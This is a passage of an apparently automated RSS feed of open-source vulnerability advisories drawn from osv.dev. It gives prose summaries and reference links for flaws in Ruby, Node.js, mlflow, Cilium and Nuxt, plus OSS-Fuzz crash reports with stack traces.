                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2021-32066'>https://osv.dev/vulnerability/BIT-ruby-min-2021-32066</a><br>
                            <b>Published:</b> 2025-01-27T07:20:44.126Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ruby/ruby/commit/a21a3b7d23704a01d34bd79d09dc37897e00922a'>https://github.com/ruby/ruby/commit/a21a3b7d23704a01d34bd79d09dc37897e00922a</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1178562'>https://hackerone.com/reports/1178562</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/10/msg00009.html'>https://lists.debian.org/debian-lts-announce/2021/10/msg00009.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/04/msg00033.html'>https://lists.debian.org/debian-lts-announce/2023/04/msg00033.html</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210902-0004/'>https://security.netapp.com/advisory/ntap-20210902-0004/</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2021/07/07/starttls-stripping-in-net-imap/'>https://www.ruby-lang.org/en/news/2021/07/07/starttls-stripping-in-net-imap/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Ruby through 2.6.7, 2.7.x through 2.7.3, and 3.x through 3.0.1. Net::IMAP does not raise an exception when StartTLS fails with an an unknown response, which might allow man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a &quot;StartTLS stripping attack.&quot;
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2021-41817: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2021-41817</link>
                    <pubDate>2025-01-27T07:20:29.820Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2021-41817'>https://osv.dev/vulnerability/BIT-ruby-min-2021-41817</a><br>
                            <b>Published:</b> 2025-01-27T07:20:29.820Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1254844'>https://hackerone.com/reports/1254844</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2021/11/15/date-parsing-method-regexp-dos-cve-2021-41817/'>https://www.ruby-lang.org/en/news/2021/11/15/date-parsing-method-regexp-dos-cve-2021-41817/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Date.parse in the date gem through 3.2.0 for Ruby allows ReDoS (regular expression Denial of Service) via a long string. The fixed versions are 3.2.1, 3.1.2, 3.0.2, and 2.0.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2021-41819: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2021-41819</link>
                    <pubDate>2025-01-27T07:20:23.123Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2021-41819'>https://osv.dev/vulnerability/BIT-ruby-min-2021-41819</a><br>
                            <b>Published:</b> 2025-01-27T07:20:23.123Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/910552'>https://hackerone.com/reports/910552</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220121-0003/'>https://security.netapp.com/advisory/ntap-20220121-0003/</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/'>https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>CGI::Cookie.parse in Ruby through 2.6.8 mishandles security prefixes in cookie names. This also affects the CGI gem through 0.3.0 for Ruby.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2022-28738: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2022-28738</link>
                    <pubDate>2025-01-27T07:20:16.333Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2022-28738'>https://osv.dev/vulnerability/BIT-ruby-min-2022-28738</a><br>
                            <b>Published:</b> 2025-01-27T07:20:16.333Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1220911'>https://hackerone.com/reports/1220911</a></li><li>- <a target='_blank' href='https://security-tracker.debian.org/tracker/CVE-2022-28738'>https://security-tracker.debian.org/tracker/CVE-2022-28738</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220624-0002/'>https://security.netapp.com/advisory/ntap-20220624-0002/</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2022/04/12/double-free-in-regexp-compilation-cve-2022-28738/'>https://www.ruby-lang.org/en/news/2022/04/12/double-free-in-regexp-compilation-cve-2022-28738/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A double free was found in the Regexp compiler in Ruby 3.x before 3.0.4 and 3.1.x before 3.1.2. If a victim attempts to create a Regexp from untrusted user input, an attacker may be able to write to unexpected memory locations.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2022-28739: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2022-28739</link>
                    <pubDate>2025-01-27T07:20:10.239Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2022-28739'>https://osv.dev/vulnerability/BIT-ruby-min-2022-28739</a><br>
                            <b>Published:</b> 2025-01-27T07:20:10.239Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/Oct/28'>http://seclists.org/fulldisclosure/2022/Oct/28</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/Oct/29'>http://seclists.org/fulldisclosure/2022/Oct/29</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/Oct/30'>http://seclists.org/fulldisclosure/2022/Oct/30</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/Oct/41'>http://seclists.org/fulldisclosure/2022/Oct/41</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/Oct/42'>http://seclists.org/fulldisclosure/2022/Oct/42</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1248108'>https://hackerone.com/reports/1248108</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/06/msg00012.html'>https://lists.debian.org/debian-lts-announce/2023/06/msg00012.html</a></li><li>- <a target='_blank' href='https://security-tracker.debian.org/tracker/CVE-2022-28739'>https://security-tracker.debian.org/tracker/CVE-2022-28739</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220624-0002/'>https://security.netapp.com/advisory/ntap-20220624-0002/</a></li><li>- <a target='_blank' href='https://support.apple.com/kb/HT213488'>https://support.apple.com/kb/HT213488</a></li><li>- <a target='_blank' href='https://support.apple.com/kb/HT213493'>https://support.apple.com/kb/HT213493</a></li><li>- <a target='_blank' href='https://support.apple.com/kb/HT213494'>https://support.apple.com/kb/HT213494</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2022/04/12/buffer-overrun-in-string-to-float-cve-2022-28739/'>https://www.ruby-lang.org/en/news/2022/04/12/buffer-overrun-in-string-to-float-cve-2022-28739/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>There is a buffer over-read in Ruby before 2.6.10, 2.7.x before 2.7.6, 3.x before 3.0.4, and 3.1.x before 3.1.2. It occurs in String-to-Float conversion, including Kernel#Float and String#to_f.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2024-27282: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2024-27282</link>
                    <pubDate>2025-01-27T07:19:56.317Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2024-27282'>https://osv.dev/vulnerability/BIT-ruby-min-2024-27282</a><br>
                            <b>Published:</b> 2025-01-27T07:19:56.317Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/2122624'>https://hackerone.com/reports/2122624</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2024/04/23/arbitrary-memory-address-read-regexp-cve-2024-27282/'>https://www.ruby-lang.org/en/news/2024/04/23/arbitrary-memory-address-read-regexp-cve-2024-27282/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20241011-0007/'>https://security.netapp.com/advisory/ntap-20241011-0007/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Ruby 3.x through 3.3.0. If attacker-supplied data is provided to the Ruby regex compiler, it is possible to extract arbitrary heap data relative to the start of the text, including pointers and sensitive strings. The fixed versions are 3.0.7, 3.1.5, 3.2.4, and 3.3.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-2025-23090: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-2025-23090</link>
                    <pubDate>2025-01-27T07:15:14.518Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-2025-23090'>https://osv.dev/vulnerability/BIT-node-2025-23090</a><br>
                            <b>Published:</b> 2025-01-27T07:15:14.518Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/2575105'>https://hackerone.com/reports/2575105</a></li></ul><br>
                            <b>Details:</b> <b></b><br>With the aid of the diagnostics_channel utility, an event can be hooked into whenever a worker thread is created. This is not limited only to workers but also exposes internal workers, where an instance of them can be fetched, and its constructor can be grabbed and reinstated for malicious usage.This vulnerability affects Permission Model users (--permission) on Node.js v20, v22, and v23.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2025-23090: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2025-23090</link>
                    <pubDate>2025-01-27T07:15:10.625Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2025-23090'>https://osv.dev/vulnerability/BIT-node-min-2025-23090</a><br>
                            <b>Published:</b> 2025-01-27T07:15:10.625Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/2575105'>https://hackerone.com/reports/2575105</a></li></ul><br>
                            <b>Details:</b> <b></b><br>With the aid of the diagnostics_channel utility, an event can be hooked into whenever a worker thread is created. This is not limited only to workers but also exposes internal workers, where an instance of them can be fetched, and its constructor can be grabbed and reinstated for malicious usage.This vulnerability affects Permission Model users (--permission) on Node.js v20, v22, and v23.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-3848: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-3848</link>
                    <pubDate>2025-01-27T07:13:35.132Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-3848'>https://osv.dev/vulnerability/BIT-mlflow-2024-3848</a><br>
                            <b>Published:</b> 2025-01-27T07:13:35.132Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/mlflow/mlflow/commit/f8d51e21523238280ebcfdb378612afd7844eca8'>https://github.com/mlflow/mlflow/commit/f8d51e21523238280ebcfdb378612afd7844eca8</a></li><li>- <a target='_blank' href='https://huntr.com/bounties/8d5aadaa-522f-4839-b41b-d7da362dd610'>https://huntr.com/bounties/8d5aadaa-522f-4839-b41b-d7da362dd610</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A path traversal vulnerability exists in mlflow&#x2F;mlflow version 2.11.0, identified as a bypass for the previously addressed CVE-2023-6909. The vulnerability arises from the application&#x27;s handling of artifact URLs, where a &#x27;#&#x27; character can be used to insert a path into the fragment, effectively skipping validation. This allows an attacker to construct a URL that, when processed, ignores the protocol scheme and uses the provided path for filesystem access. As a result, an attacker can read arbitrary files, including sensitive information such as SSH and cloud keys, by exploiting the way the application converts the URL into a filesystem path. The issue stems from insufficient validation of the fragment portion of the URL, leading to arbitrary file read through path traversal.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-hubble-relay-2025-23028: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-hubble-relay-2025-23028</link>
                    <pubDate>2025-01-27T07:11:06.033Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-hubble-relay-2025-23028'>https://osv.dev/vulnerability/BIT-hubble-relay-2025-23028</a><br>
                            <b>Published:</b> 2025-01-27T07:11:06.033Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/pull/36252'>https://github.com/cilium/cilium/pull/36252</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7'>https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cilium is a networking, observability, and security solution with an eBPF-based dataplane. A denial of service vulnerability affects versions 1.14.0 through 1.14.7, 1.15.0 through 1.15.11, and 1.16.0 through 1.16.4. In a Kubernetes cluster where Cilium is configured to proxy DNS traffic, an attacker can crash Cilium agents by sending a crafted DNS response to workloads from outside the cluster. For traffic that is allowed but without using DNS-based policy, the dataplane will continue to pass traffic as configured at the time of the DoS. For workloads that have DNS-based policy configured, existing connections may continue to operate, and new connections made without relying on DNS resolution may continue to be established, but new connections which rely on DNS resolution may be disrupted. Any configuration changes that affect the impacted agent may not be applied until the agent is able to restart. This issue is fixed in Cilium v1.14.18, v1.15.12, and v1.16.5. No known workarounds are available.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-hubble-relay-2025-23047: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-hubble-relay-2025-23047</link>
                    <pubDate>2025-01-27T07:10:59.516Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-hubble-relay-2025-23047'>https://osv.dev/vulnerability/BIT-hubble-relay-2025-23047</a><br>
                            <b>Published:</b> 2025-01-27T07:10:59.516Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d'>https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356'>https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cilium is a networking, observability, and security solution with an eBPF-based dataplane. An insecure default `Access-Control-Allow-Origin` header value could lead to sensitive data exposure for users of Cilium versions 1.14.0 through 1.14.7, 1.15.0 through 1.15.11, and 1.16.0 through 1.16.4 who deploy Hubble UI using either Cilium CLI or via the Cilium Helm chart. A user with access to a Hubble UI instance affected by this issue could leak configuration details about the Kubernetes cluster which Hubble UI is monitoring, including node names, IP addresses, and other metadata about workloads and the cluster networking configuration. In order for this vulnerability to be exploited, a victim would have to first visit a malicious page. This issue is fixed in Cilium v1.14.18, v1.15.12, and v1.16.5. As a workaround, users who deploy Hubble UI using the Cilium Helm chart directly can remove the CORS headers from the Helm template as shown in the patch from commit a3489f190ba6e87b5336ee685fb6c80b1270d06d.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-cilium-operator-2025-23028: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-cilium-operator-2025-23028</link>
                    <pubDate>2025-01-27T07:09:21.127Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-cilium-operator-2025-23028'>https://osv.dev/vulnerability/BIT-cilium-operator-2025-23028</a><br>
                            <b>Published:</b> 2025-01-27T07:09:21.127Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/pull/36252'>https://github.com/cilium/cilium/pull/36252</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7'>https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cilium is a networking, observability, and security solution with an eBPF-based dataplane. A denial of service vulnerability affects versions 1.14.0 through 1.14.7, 1.15.0 through 1.15.11, and 1.16.0 through 1.16.4. In a Kubernetes cluster where Cilium is configured to proxy DNS traffic, an attacker can crash Cilium agents by sending a crafted DNS response to workloads from outside the cluster. For traffic that is allowed but without using DNS-based policy, the dataplane will continue to pass traffic as configured at the time of the DoS. For workloads that have DNS-based policy configured, existing connections may continue to operate, and new connections made without relying on DNS resolution may continue to be established, but new connections which rely on DNS resolution may be disrupted. Any configuration changes that affect the impacted agent may not be applied until the agent is able to restart. This issue is fixed in Cilium v1.14.18, v1.15.12, and v1.16.5. No known workarounds are available.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-cilium-2025-23028: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-cilium-2025-23028</link>
                    <pubDate>2025-01-27T07:09:18.725Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-cilium-2025-23028'>https://osv.dev/vulnerability/BIT-cilium-2025-23028</a><br>
                            <b>Published:</b> 2025-01-27T07:09:18.725Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/pull/36252'>https://github.com/cilium/cilium/pull/36252</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7'>https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cilium is a networking, observability, and security solution with an eBPF-based dataplane. A denial of service vulnerability affects versions 1.14.0 through 1.14.7, 1.15.0 through 1.15.11, and 1.16.0 through 1.16.4. In a Kubernetes cluster where Cilium is configured to proxy DNS traffic, an attacker can crash Cilium agents by sending a crafted DNS response to workloads from outside the cluster. For traffic that is allowed but without using DNS-based policy, the dataplane will continue to pass traffic as configured at the time of the DoS. For workloads that have DNS-based policy configured, existing connections may continue to operate, and new connections made without relying on DNS resolution may continue to be established, but new connections which rely on DNS resolution may be disrupted. Any configuration changes that affect the impacted agent may not be applied until the agent is able to restart. This issue is fixed in Cilium v1.14.18, v1.15.12, and v1.16.5. No known workarounds are available.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-cilium-operator-2025-23047: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-cilium-operator-2025-23047</link>
                    <pubDate>2025-01-27T07:09:12.819Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-cilium-operator-2025-23047'>https://osv.dev/vulnerability/BIT-cilium-operator-2025-23047</a><br>
                            <b>Published:</b> 2025-01-27T07:09:12.819Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d'>https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356'>https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cilium is a networking, observability, and security solution with an eBPF-based dataplane. An insecure default `Access-Control-Allow-Origin` header value could lead to sensitive data exposure for users of Cilium versions 1.14.0 through 1.14.7, 1.15.0 through 1.15.11, and 1.16.0 through 1.16.4 who deploy Hubble UI using either Cilium CLI or via the Cilium Helm chart. A user with access to a Hubble UI instance affected by this issue could leak configuration details about the Kubernetes cluster which Hubble UI is monitoring, including node names, IP addresses, and other metadata about workloads and the cluster networking configuration. In order for this vulnerability to be exploited, a victim would have to first visit a malicious page. This issue is fixed in Cilium v1.14.18, v1.15.12, and v1.16.5. As a workaround, users who deploy Hubble UI using the Cilium Helm chart directly can remove the CORS headers from the Helm template as shown in the patch from commit a3489f190ba6e87b5336ee685fb6c80b1270d06d.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-cilium-2025-23047: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-cilium-2025-23047</link>
                    <pubDate>2025-01-27T07:09:11.634Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-cilium-2025-23047'>https://osv.dev/vulnerability/BIT-cilium-2025-23047</a><br>
                            <b>Published:</b> 2025-01-27T07:09:11.634Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d'>https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356'>https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cilium is a networking, observability, and security solution with an eBPF-based dataplane. An insecure default `Access-Control-Allow-Origin` header value could lead to sensitive data exposure for users of Cilium versions 1.14.0 through 1.14.7, 1.15.0 through 1.15.11, and 1.16.0 through 1.16.4 who deploy Hubble UI using either Cilium CLI or via the Cilium Helm chart. A user with access to a Hubble UI instance affected by this issue could leak configuration details about the Kubernetes cluster which Hubble UI is monitoring, including node names, IP addresses, and other metadata about workloads and the cluster networking configuration. In order for this vulnerability to be exploited, a victim would have to first visit a malicious page. This issue is fixed in Cilium v1.14.18, v1.15.12, and v1.16.5. As a workaround, users who deploy Hubble UI using the Cilium Helm chart directly can remove the CORS headers from the Helm template as shown in the patch from commit a3489f190ba6e87b5336ee685fb6c80b1270d06d.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-63: 0 | <b>Stack-buffer-underflow in gs_type1_interpret</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-63</link>
                    <pubDate>2025-01-27T00:10:00.833706Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-63'>https://osv.dev/vulnerability/OSV-2025-63</a><br>
                            <b>Published:</b> 2025-01-27T00:10:00.833706Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391934080'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391934080</a></li></ul><br>
                            <b>Details:</b> <b>Stack-buffer-underflow in gs_type1_interpret</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=391934080

```
Crash type: Stack-buffer-underflow READ 4
Crash state:
gs_type1_interpret
copied_type1_glyph_outline
gs_default_glyph_info
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-61: 0 | <b>Heap-buffer-overflow in oatpp::json::Utils::escapeString</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-61</link>
                    <pubDate>2025-01-27T00:00:09.905879Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-61'>https://osv.dev/vulnerability/OSV-2025-61</a><br>
                            <b>Published:</b> 2025-01-27T00:00:09.905879Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391916478'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391916478</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in oatpp::json::Utils::escapeString</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=391916478

```
Crash type: Heap-buffer-overflow WRITE 1
Crash state:
oatpp::json::Utils::escapeString
oatpp::json::Serializer::serializeString
oatpp::json::Serializer::serializePairs
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-24360: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-24360</link>
                    <pubDate>2025-01-25T01:15:24Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-24360'>https://osv.dev/vulnerability/CVE-2025-24360</a><br>
                            <b>Published:</b> 2025-01-25T01:15:24Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263'>https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39'>https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/pull/23995'>https://github.com/nuxt/nuxt/pull/23995</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Nuxt is an open-source web development framework for Vue.js. Starting in version 3.8.1 and prior to version 3.15.3, Nuxt allows any websites to send any requests to the development server and read the response due to default CORS settings. Users with the default server.cors option using Vite builder may get the source code stolen by malicious websites. Version 3.15.3 fixes the vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1424: 0 | <b>Heap-buffer-overflow in extract_candidate</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1424</link>
                    <pubDate>2025-01-25T00:17:13.787335Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1424'>https://osv.dev/vulnerability/OSV-2024-1424</a><br>
                            <b>Published:</b> 2025-01-25T00:17:13.787335Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
